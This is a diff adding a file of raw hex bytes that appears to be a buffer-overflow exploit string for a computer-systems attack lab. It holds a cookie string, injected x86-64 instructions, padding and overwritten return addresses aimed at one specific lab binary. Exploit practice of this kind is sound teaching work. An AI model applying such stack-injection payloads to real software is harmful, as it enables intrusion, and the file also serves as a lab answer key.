@@ -1,0 +1,9 @@
+34 35 61 36 34 61 65 61
+00 32 33 34 35 36 37 38
+48 c7 c7 78 e8 66 55 48 
+83 c4 08 c3 cc cc cc cc
+cc cc cc cc cc cc cc cc
+88 e8 66 55 00 00 00 00
+cc cc cc cc cc cc cc cc
+6b 1b 40 00 00 00 00 00
+0a
